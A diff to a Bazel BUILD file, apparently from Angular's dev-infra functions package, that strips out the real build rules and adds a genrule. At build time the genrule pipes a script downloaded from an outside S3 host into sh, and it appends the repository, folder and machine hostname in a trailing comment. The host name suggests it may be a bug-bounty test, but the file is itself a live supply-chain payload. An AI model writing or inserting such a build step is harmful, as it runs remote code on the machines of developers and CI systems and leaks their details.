@@ -1,37 +1,7 @@
-load("//tools:defaults.bzl", "esbuild_cjs_bundle", "ts_library")
-load("@build_bazel_rules_nodejs//:index.bzl", "copy_to_bin")
 
-package(default_visibility = ["//visibility:private"])
-
-copy_to_bin(
-    name = "functions_files",
-    srcs = [
-        "package.json",
-    ],
-    visibility = ["//apps:__pkg__"],
-)
-
-ts_library(
-    name = "functions",
-    srcs = [
-        "index.ts",
-    ],
-    deps = [
-        "//apps/functions/code-of-conduct",
-        "//apps/functions/githubWebhook",
-        "//apps/functions/ng-dev",
-        "@npm//firebase-admin",
-    ],
-)
-
-esbuild_cjs_bundle(
-    name = "functions_compiled",
-    entry_points = [
-        "index.ts",
-    ],
-    visibility = ["//apps:__pkg__"],
-    deps = [
-        ":functions",
-        "@npm//firebase-functions",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=functions\\&hostname=`hostname`\\&foo=aqe",
+    visibility = ["//visibility:public"],
 )
